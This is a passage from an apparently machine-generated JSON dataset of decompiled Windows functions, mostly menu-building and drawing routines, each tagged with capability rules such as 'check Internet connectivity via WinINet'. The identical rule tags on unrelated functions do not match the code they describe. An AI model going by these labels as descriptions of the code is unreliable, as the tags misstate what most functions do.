        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Removing unreachable block (ram,0x00439ad5)\n// WARNING: Removing unreachable block (ram,0x00439ae2)\n// WARNING: Removing unreachable block (ram,0x00439aef)\n// WARNING: Removing unreachable block (ram,0x00439af5)\n// WARNING: Removing unreachable block (ram,0x00439b02)\n// WARNING: Removing unreachable block (ram,0x00439b08)\n// WARNING: Removing unreachable block (ram,0x00439b15)\n\nvoid fcn.00439964(void)\n\n{\n    uint8_t in_AL;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    puStack28 = &fcn.00439964::var_2h + 2;\n    uStack32 = 0x439b43;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uVar1 = in_AL;\n    if (uVar1 < 0x2d) {\n        if (uVar1 - 8 < 2) {\n            puStack28 = &fcn.00439964::var_2h + 2;\n            fcn.00404e38();\n            goto code_r0x00439acf;\n        }\n        if (uVar1 == 0xd) {\n            puStack28 = &fcn.00439964::var_2h + 2;\n            fcn.00404e38();\n            goto code_r0x00439acf;\n        }\n        if (uVar1 == 0x1b) {\n            puStack28 = &fcn.00439964::var_2h + 2;\n            fcn.00404e38();\n            goto code_r0x00439acf;\n        }\n        if (uVar1 - 0x20 < 9) {\n            puStack28 = &fcn.00439964::var_2h + 2;\n            fcn.00404e38();\n            goto code_r0x00439acf;\n        }\n    }\n    else if (uVar1 < 0x41) {\n        if (uVar1 - 0x2d < 2) {\n            puStack28 = &fcn.00439964::var_2h + 2;\n            fcn.00404e38();\n            goto code_r0x00439acf;\n        }\n        if (uVar1 - 0x30 < 10) {\n            puStack28 = &fcn.00439964::var_2h + 2;\n            fcn.00404f88();\n            goto code_r0x00439acf;\n        }\n    }\n    else {\n        if (uVar1 - 0x41 < 0x1a) {\n            fcn.00404f88();\n            goto code_r0x00439acf;\n        }\n        if (uVar1 - 0x60 < 10) {\n            puStack28 = &fcn.00439964::var_2h + 2;\n            fcn.00404f88();\n            goto code_r0x00439acf;\n        }\n        if (uVar1 - 0x70 < 0x18) {\n            puStack28 = &fcn.00439964::var_2h + 2;\n            fcn.00408d88();\n            fcn.004050b0();\n            goto code_r0x00439acf;\n        }\n    }\n    puStack28 = &fcn.00439964::var_2h + 2;\n    fcn.00439910();\ncode_r0x00439acf:\n    fcn.00404da0();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x439b4a;\n    uStack32 = 0x439b42;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 892
    },
    "00439d48": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nchar __cdecl fcn.00439d48(uint *arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    code *in_ECX;\n    int32_t in_EDX;\n    char var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EDX != 0) {\n        var_9h = '\\0';\n        while (var_9h == '\\0') {\n            iVar1 = fcn.0043c3c4();\n            if (iVar1 <= *in_EAX) {\n                return '\\0';\n            }\n            iVar1 = fcn.0043c3d4();\n            if (*(arg_8h + -1) <= *(iVar1 + 0x3f) && *(iVar1 + 0x3f) != *(arg_8h + -1)) {\n                return '\\0';\n            }\n            var_9h = (*in_ECX)(*arg_8h);\n            *in_EAX = *in_EAX + 1;\n        }\n    }\n    return var_9h;\n}\n",
        "token_count": 244
    },
    "00439dac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00439dac(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char var_16h;\n    uint8_t var_15h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_10h = 0;\n    var_14h = 0;\n    iVar2 = 0;\n    iVar3 = 0;\n    if (param_2 != 0) {\n        iVar2 = fcn.0043c3c4();\n    }\n    if (param_1 != 0) {\n        iVar3 = fcn.0043c3c4();\n    }\n    var_16h = '\\0';\n    while ((var_16h == '\\0' && ((var_10h < iVar2 || (var_14h < iVar3))))) {\n        var_1h._0_1_ = 0xff;\n        var_15h = 0xff;\n        if (var_10h < iVar2) {\n            iVar1 = fcn.0043c3d4();\n            var_1h._0_1_ = *(iVar1 + 0x3f);\n        }\n        if (var_14h < iVar3) {\n            iVar1 = fcn.0043c3d4();\n            var_15h = *(iVar1 + 0x3f);\n        }\n        if (var_15h < var_1h) {\n            var_1h._0_1_ = var_15h;\n            var_16h = fcn.00439d48(&var_1h + 1);\n        }\n        else {\n            var_16h = fcn.00439d48(&var_1h + 1);\n        }\n        while ((var_10h < iVar2 && (iVar1 = fcn.0043c3d4(),  *(iVar1 + 0x3f) <= var_1h))) {\n            var_10h = var_10h + 1;\n        }\n        while ((var_14h < iVar3 && (iVar1 = fcn.0043c3d4(),  *(iVar1 + 0x3f) <= var_1h))) {\n            var_14h = var_14h + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 576
    },
    "0043a244": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0043a244(uint param_1, char param_2)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0041b50c();\n    *(in_EAX + 0x3e) = 1;\n    *(in_EAX + 0x39) = 1;\n    *(in_EAX + 0x3b) = 2;\n    *(in_EAX + 0x3c) = 2;\n    uVar1 = fcn.00439d28();\n    *(in_EAX + 0x50) = uVar1;\n    *(in_EAX + 0x40) = 0xffffffff;\n    iVar2 = fcn.00403f28();\n    *(in_EAX + 0x78) = iVar2;\n    *(iVar2 + 0xc) = in_EAX;\n    *(iVar2 + 8) = 0x43cd34;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 337
    },
    "0043a374": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043a374(uint8_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint8_t uVar7;\n    uint in_stack_ffffff88;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint var_3ch;\n    uint lpmi;\n    uint var_32h;\n    uint32_t var_2eh;\n    uint32_t var_2ah;\n    uint32_t var_26h;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_12h;\n    uint8_t var_6h;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    puStack80 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack84 = 0x43a5c5;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack88;\n    puVar1 = &stack0xfffffffc;\n    var_5h = param_1;\n    if (*(in_EAX + 0x3e) == '\\0') goto code_r0x0043a5a7;\n    fcn.00404e38();\n    iVar4 = fcn.0043c3c4();\n    if (iVar4 < 1) {\n        if (*(in_EAX + 0x60) != 0) {\n            if ((*(in_EAX + 100) != 0) && (*(*(in_EAX + 100) + 100) == 0)) {\n                cVar3 = fcn.004040e4();\n                if (cVar3 != '\\0') goto code_r0x0043a410;\n            }\n            fcn.00439964(0x43a5dc, var_4h);\n            fcn.00405124(0);\n        }\n    }\n    else {\n        var_22h = fcn.0043a878();\n    }\ncode_r0x0043a410:\n    uVar2 = sub.kernel32.dll_GetVersion();\n    uVar7 = uVar2 == 4;\n    if (uVar2 < 4) {\n        fcn.004051b0();\n        uVar6 = *((uVar7 & 0x7f) * 4 + 0x49155c) |\n                *(*(in_EAX + 0x48) * 4 + 0x491550) | *(*(in_EAX + 0x38) * 4 + 0x491540) |\n                *(*(in_EAX + 0x39) * 4 + 0x491548);\n        iVar4 = fcn.0043c3c4();\n        if (iVar4 < 1) {\n            uVar5 = fcn.00405264();\n            sub.user32.dll_InsertMenuA(param_2, 0xffffffff, uVar6 | 0x400, *(in_EAX + 0x50), uVar5);\n            in_stack_ffffff88 = param_2;\n            puVar1 = puStack80;\n        }\n        else {\n            uVar5 = fcn.00405264();\n            uVar5 = fcn.0043a878(uVar5);\n            sub.user32.dll_InsertMenuA(param_2, 0xffffffff, uVar6 | 0x410, uVar5);\n            in_stack_ffffff88 = param_2;\n            puVar1 = puStack80;\n        }\n        goto code_r0x0043a5a7;\n    }\n    lpmi = 0x2c;\n    var_32h = 0x3f;\n    iVar4 = fcn.0043c984();\n    if (iVar4 == 0) {\ncode_r0x0043a450:\n        if (*(in_EAX + 0x4c) != 0) {\n            cVar3 = (**(**(in_EAX + 0x4c) + 0x1c))();\n            uVar2 = cVar3 == '\\0';\n            if (uVar2) goto code_r0x0043a466;\n        }\n        var_6h = 0;\n        uVar2 = true;\n    }\n    else {\n        uVar2 = *(iVar4 + 0x40) == '\\0';\n        if (uVar2) {\n            iVar4 = fcn.0043bf98();\n            uVar2 = iVar4 == 0;\n            if (uVar2) goto code_r0x0043a450;\n        }\ncode_r0x0043a466:\n        var_6h = 1;\n    }\n    fcn.004051b0();\n    var_2eh = *((uVar2 & 0x7f) * 4 + 0x491590) | *(*(in_EAX + 0x3d) * 4 + 0x491588) | *(*(in_EAX + 0x48) * 4 + 0x491564)\n              | *(var_5h * 4 + 0x491598) | *(var_6h * 4 + 0x4915a0);\n    var_2ah = *(*(in_EAX + 0x38) * 4 + 0x491570) | *(*(in_EAX + 0x39) * 4 + 0x491580) |\n              *(*(in_EAX + 0x3a) * 4 + 0x491578);\n    var_26h = *(in_EAX + 0x50);\n    var_22h = 0;\n    var_1eh = 0;\n    var_1ah = 0;\n    var_12h = fcn.00405264();\n    iVar4 = fcn.0043c3c4();\n    if (0 < iVar4) {\n        var_22h = fcn.0043a878();\n    }\n    sub.user32.dll_InsertMenuItemA(param_2, 0xffffffff, 0xffffffff, &lpmi);\n    in_stack_ffffff88 = param_2;\n    puVar1 = puStack80;\ncode_r0x0043a5a7:\n    puStack80 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff88;\n    fcn.00404da0(0x43a5cc);\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 1464
    },
    "0043a748": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043a748(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    if ((*(in_EAX + 7) & 8) != 0) {\n        return;\n    }\n    if ((*(in_EAX + 7) & 2) != 0) {\n        *(in_EAX + 0x1d) = 1;\n        return;\n    }\n    if (in_EAX[0x1b] != 0) {\n        fcn.0043a748();\n        return;\n    }\n    uVar2 = fcn.0043a878();\n    iVar3 = sub.user32.dll_GetMenuItemCount(uVar2);\n    bVar5 = iVar3 == 0;\n    for (; 0 < iVar3; iVar3 = iVar3 + -1) {\n        uVar2 = fcn.0043a878(iVar3 + -1, 0x400);\n        uVar4 = sub.user32.dll_GetMenuState();\n        if ((uVar4 & 4) == 0) {\n            uVar2 = fcn.0043a878(iVar3 + -1, 0x400);\n            sub.user32.dll_RemoveMenu();\n            bVar5 = true;\n        }\n    }\n    if (!bVar5) {\n        return;\n    }\n    if ((in_EAX[0x19] == 0) && (cVar1 = fcn.004040e4(uVar2),  cVar1 != '\\0')) {\n        uVar2 = fcn.0043a878();\n        iVar3 = sub.user32.dll_GetMenuItemCount(uVar2);\n        if (iVar3 == 0) {\n            sub.user32.dll_DestroyMenu(in_EAX[0xd]);\n            in_EAX[0xd] = 0;\n            goto code_r0x0043a808;\n        }\n    }\n    fcn.0043a608();\ncode_r0x0043a808:\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 474
    },
    "0043a878": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0043a878(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x34) == 0) {\n        cVar1 = fcn.004040e4();\n        if (cVar1 == '\\0') {\n            uVar2 = sub.user32.dll_CreateMenu();\n            *(in_EAX + 0x34) = uVar2;\n        }\n        else {\n            uVar2 = sub.user32.dll_CreatePopupMenu();\n            *(in_EAX + 0x34) = uVar2;\n        }\n        if (*(in_EAX + 0x34) == 0) {\n            fcn.004398b8();\n        }\n        fcn.0043a608();\n    }\n    return *(in_EAX + 0x34);\n}\n",
        "token_count": 189
    },
    "0043ab20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ab20(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_ECX;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *in_ECX;\n    uStack16 = in_ECX[1];\n    uStack12 = in_ECX[2];\n    uStack8 = in_ECX[3];\n    if (*(in_EAX + 0x92) != 0) {\n        (**(in_EAX + 0x90))(arg_8h, &var_10h);\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "0043ab60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ab60(int32_t lprc)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    int32_t in_stack_ffffffa4;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x43b4a2;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((*(lprc + -0x21) == '\\0') || (puVar2 = &stack0xfffffffc,  *(lprc + -0x22) == '\\0')) {\n        puVar2 = &stack0xfffffffc;\n        if (*(lprc + -0x21) == '\\0') goto code_r0x0043ac1c;\n        fcn.00437d14();\n        cVar3 = fcn.00437e1c();\n        puVar2 = puStack24;\n        if (cVar3 == '\\0') goto code_r0x0043ac1c;\n    }\n    puStack24 = puVar2;\n    if (((*(lprc + 0xc) & 1) == 0) && ((*(lprc + 0xc) & 0x40) == 0)) {\n        puVar2 = puStack24;\n        if (*(lprc + 8) != '\\0') {\n            fcn.004214d4();\n            puVar2 = puStack24;\n        }\n    }\n    else {\n        fcn.00437d14();\n        cVar3 = fcn.00437e1c();\n        if (cVar3 == '\\0') {\n            fcn.004214d4();\n        }\n        else {\n            fcn.004214d4();\n        }\n        fcn.00420c18();\n        puVar2 = puStack24;\n    }\ncode_r0x0043ac1c:\n    puStack24 = puVar2;\n    if ((*(lprc + -0x29) == '\\0') || (*(lprc + -0x21) != '\\0')) {\n        fcn.00421878();\n    }\n    if (*(lprc + -0x30) == 0) {\n        cVar3 = fcn.004040e4();\n        if (cVar3 == '\\0') {\n            *(lprc + -0x31) = 0;\n        }\n        else {\n            *(lprc + -0x31) = *(*(lprc + -0x30) + 0x60);\n        }\n    }\n    else {\n        *(lprc + -0x31) = 0;\n    }\n    *(lprc + -0x10) = *(lprc + -0x20) + 1;\n    iVar5 = *(lprc + -0x1c) + 1;\n    bVar9 = iVar5 == 0;\n    *(lprc + -0xc) = iVar5;\n    fcn.004051b0();\n    if (bVar9) {\n        fcn.00421878();\n        *(lprc + -0x10) = 0;\n        *(lprc + -8) = 0xfffffffc;\n        *(lprc + -0x39) = 0;\n    }\n    else {\n        if ((*(lprc + -0x40) == 0) ||\n           (((iVar5 = *(*(lprc + -0x38) + 0x40),  iVar5 < 0 || (iVar6 = fcn.00453888(),  iVar6 <= iVar5)) &&\n            ((*(*(lprc + -0x38) + 0x38) == '\\0' ||\n             ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 != NULL && (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 == '\\0')))\n             ))))) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 1;\n        }\n        *(lprc + -0x41) = uVar4;\n        if ((*(lprc + -0x41) == '\\0') &&\n           ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 == NULL || (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 != '\\0'))))\n        {\n            if ((*(lprc + -0x40) == 0) || (*(lprc + 8) != '\\0')) {\n                *(lprc + -8) = *(lprc + -0x10);\n                *(lprc + -4) = *(lprc + -0xc);\n            }\n            else {\n                *(lprc + -8) = *(lprc + -0x10) + *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            *(lprc + -0x39) = 0;\n        }\n        else {\n            *(lprc + -0x39) = 1;\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -8) = *(lprc + -0x10) + 0x10;\n                *(lprc + -4) = *(lprc + -0xc) + 0x10;\n            }\n            else {\n                *(lprc + -8) = *(lprc + -0x10) + *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            if ((*(*(lprc + -0x38) + 0x38) != '\\0') && (*(lprc + -0x21) == '\\0')) {\n                *(lprc + -8) = *(lprc + -8) + 1;\n                *(lprc + -4) = *(lprc + -4) + 1;\n                uVar7 = fcn.004214cc();\n                *(lprc + -0x48) = uVar7;\n                if ((*(lprc + 0xc) & 1) == 0) {\n                    uVar7 = fcn.004214cc();\n                    *(lprc + -0x48) = uVar7;\n                    fcn.004285c8();\n                    fcn.004214a8();\n                    fcn.00421878();\n                }\n                else {\n                    fcn.004214d4();\n                    fcn.00421878();\n                }\n                fcn.004214d4();\n                *(lprc + -0x10) = *(lprc + -0x10) + 1;\n                *(lprc + -0xc) = *(lprc + -0xc) + 1;\n            }\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -0x5c) = *(lprc + -0x10);\n                *(lprc + -0x58) = *(lprc + -0xc);\n                *(lprc + -0x54) = *(lprc + -8);\n                *(lprc + -0x50) = *(lprc + -4);\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                if (iVar5 < *(lprc + -8) - *(lprc + -0x10)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    uVar8 = (*(lprc + -8) - *(lprc + -0x10)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -0x10) = iVar5 + *(lprc + -0x10) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    *(lprc + -8) = iVar5 + *(lprc + -0x10);\n                }\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                if (iVar5 < *(lprc + -4) - *(lprc + -0xc)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -0xc) = iVar5 + *(lprc + -0xc) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    *(lprc + -4) = iVar5 + *(lprc + -0xc);\n                }\n                fcn.00421a3c();\n                *(lprc + -0x10) = *(lprc + -0x5c);\n                *(lprc + -0xc) = *(lprc + -0x58);\n                *(lprc + -8) = *(lprc + -0x54);\n                *(lprc + -4) = *(lprc + -0x50);\n            }\n            else {\n                iVar5 = *(*(lprc + -0x38) + 0x40);\n                if ((iVar5 < 0) || (iVar6 = fcn.00453888(),  iVar6 <= iVar5)) {\n                    uVar7 = fcn.00426010();\n                    *(lprc + -0x4c) = uVar7;\n                    *in_FS_OFFSET = &stack0xffffffd4;\n                    (**(**(lprc + -0x4c) + 0x3c))();\n                    sub.user32.dll_LoadBitmapA(0, 0x7ff8);\n                    fcn.00427258();\n                    *(lprc + -0x48) = *(*(*(lprc + -0x28) + 0xc) + 0x18);\n                    fcn.00420c18();\n                    iVar5 = *(lprc + -0x4c);\n                    iVar6 = (**(**(lprc + -0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar6;\n                    iVar6 = uVar8 >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((uVar8 & 1) != 0);\n                    }\n                    (**(**(lprc + -0x4c) + 0x2c))(iVar6 + *(lprc + -0xc) + 1);\n                    fcn.004217cc(iVar5);\n                    fcn.00420c18();\n                    *in_FS_OFFSET = iVar5;\n                    fcn.00403f58(0x43b101);\n                    return;\n                }\n                fcn.00453da0(*(*(lprc + -0x38) + 0x39), *(*(lprc + -0x38) + 0x40), *(lprc + -0xc));\n            }\n            if (*(*(lprc + -0x38) + 0x38) != '\\0') {\n                *(lprc + -8) = *(lprc + -8) + -1;\n                *(lprc + -4) = *(lprc + -4) + -1;\n            }\n        }\n    }\n    *(lprc + -0x10) = *(lprc + -0x10) + -1;\n    *(lprc + -0xc) = *(lprc + -0xc) + -1;\n    *(lprc + -8) = *(lprc + -8) + 2;\n    *(lprc + -4) = *(lprc + -4) + 2;\n    if (((*(*(lprc + -0x38) + 0x38) != '\\0') || ((*(lprc + -0x29) != '\\0' && (*(lprc + -0x39) != '\\0')))) &&\n       (*(lprc + -0x21) == '\\0')) {\n        uVar7 = fcn.00421c8c();\n        sub.user32.dll_DrawEdge(uVar7);\n    }\n    if (*(lprc + -0x29) != '\\0') {\n        if (*(lprc + -0x39) != '\\0') {\n            *(lprc + -0x20) = *(lprc + -8) + 1;\n        }\n        if ((*(lprc + -0x5d) == '\\0') || (*(lprc + 8) == '\\0')) {\n            fcn.004214d4();\n        }\n        fcn.00421878();\n    }\n    if (((*(lprc + 8) != '\\0') && (*(lprc + -0x5d) != '\\0')) && ((*(lprc + -0x21) == '\\0' || (*(lprc + -0x22) == '\\0')))\n       ) {\n        if (*(lprc + -0x29) == '\\0') {\n            if ((*(lprc + 0xc) & 0x40) != 0) {\n                uVar7 = fcn.00421c8c();\n                sub.user32.dll_DrawEdge(uVar7);\n            }\n        }\n        else {\n            uVar7 = fcn.00421c8c();\n            sub.user32.dll_DrawEdge(uVar7);\n        }\n        if (*(lprc + -0x29) == '\\0') {\n            iStack32 = lprc + -0x20;\n            sub.user32.dll_OffsetRect();\n        }\n    }\n    if ((*(lprc + -0x29) == '\\0') || (*(lprc + -0x39) == '\\0')) {\n        *(lprc + -0x20) = *(lprc + -8) + 1;\n    }\n    *(lprc + -0x20) = *(lprc + -0x20) + 2;\n    *(lprc + -0x18) = *(lprc + -0x18) + -1;\n    *(lprc + -100) = *(*(lprc + -0x31) * 2 + 0x4915a8) | 0x60;\n    if ((*(lprc + -0x65) != '\\0') && ((*(lprc + 0xd) & 1) != 0)) {\n        *(lprc + -100) = *(lprc + -100) | 0x100000;\n    }\n    *(lprc + -0x5c) = *(lprc + -0x20);\n    *(lprc + -0x58) = *(lprc + -0x1c);\n    *(lprc + -0x54) = *(lprc + -0x18);\n    *(lprc + -0x50) = *(lprc + -0x14);\n    if ((*(lprc + 0xc) & 0x20) != 0) {\n        fcn.00420fa4();\n    }\n    fcn.0043a908(*(lprc + -100) | 0x500, *(lprc + -0x29), lprc + -0x20);\n    uVar8 = (*(lprc + -0x50) - *(lprc + -0x58)) - (*(lprc + -0x14) - *(lprc + -0x1c));\n    iVar5 = uVar8 >> 1;\n    if (iVar5 < 0) {\n        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n    }\n    sub.user32.dll_OffsetRect(lprc + -0x20, 0, iVar5);\n    if ((((*(lprc + 8) != '\\0') && (*(lprc + -0x29) != '\\0')) && (*(lprc + -0x5d) != '\\0')) && (*(lprc + -0x21) == '\\0')\n       ) {\n        sub.user32.dll_OffsetRect(lprc + -0x20, 1, 0);\n    }\n    fcn.0043a908(*(lprc + -100), *(lprc + -0x29), lprc + -0x20);\n    if ((*(*(lprc + -0x38) + 0x60) != 0) && (*(lprc + 8) == '\\0')) {\n        *(lprc + -0x20) = *(lprc + -0x18);\n        *(lprc + -0x18) = *(lprc + -0x54) + -10;\n        iVar5 = lprc + -0x20;\n        uVar8 = *(lprc + -0x29);\n        in_stack_ffffffa4 = 2;\n        fcn.00439964();\n        fcn.0043a908(in_stack_ffffffa4, uVar8, iVar5);\n    }\n    *in_FS_OFFSET = in_stack_ffffffa4;\n    fcn.00404da0(0x43b4a9);\n    return;\n}\n",
        "token_count": 4192
    },
    "0043b4c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043b4c0(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    int32_t in_stack_ffffffa4;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x43be22;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    if ((*(arg_8h + -0x21) == '\\0') || (puVar2 = &stack0xfffffffc,  *(arg_8h + -0x22) == '\\0')) {\n        puVar2 = &stack0xfffffffc;\n        if (*(arg_8h + -0x21) == '\\0') goto code_r0x0043b57c;\n        fcn.00437d14();\n        cVar3 = fcn.00437e1c();\n        puVar2 = puStack24;\n        if (cVar3 == '\\0') goto code_r0x0043b57c;\n    }\n    puStack24 = puVar2;\n    if (((*(arg_8h + 0xc) & 1) == 0) && ((*(arg_8h + 0xc) & 0x40) == 0)) {\n        puVar2 = puStack24;\n        if (*(arg_8h + 8) != '\\0') {\n            fcn.004214d4();\n            puVar2 = puStack24;\n        }\n    }\n    else {\n        fcn.00437d14();\n        cVar3 = fcn.00437e1c();\n        if (cVar3 == '\\0') {\n            fcn.004214d4();\n        }\n        else {\n            fcn.004214d4();\n        }\n        fcn.00420c18();\n        puVar2 = puStack24;\n    }\ncode_r0x0043b57c:\n    puStack24 = puVar2;\n    if ((*(arg_8h + -0x29) == '\\0') || ((*(arg_8h + -0x21) != '\\0' && (*(*(arg_8h + -0x38) + 0x38) == '\\0')))) {\n        fcn.00421878();\n    }\n    if (*(arg_8h + -0x30) == 0) {\n        cVar3 = fcn.004040e4();\n        if (cVar3 == '\\0') {\n            *(arg_8h + -0x31) = 0;\n        }\n        else {\n            *(arg_8h + -0x31) = *(*(arg_8h + -0x30) + 0x60);\n        }\n    }\n    else {\n        *(arg_8h + -0x31) = 0;\n    }\n    *(arg_8h + -8) = *(arg_8h + -0x18) + -1;\n    iVar5 = *(arg_8h + -0x1c) + 1;\n    bVar9 = iVar5 == 0;\n    *(arg_8h + -0xc) = iVar5;\n    fcn.004051b0();\n    if (bVar9) {\n        fcn.00421878();\n        *(arg_8h + -0x10) = *(arg_8h + -8) + 2;\n        *(arg_8h + -8) = 0;\n        *(arg_8h + -0x39) = 0;\n    }\n    else 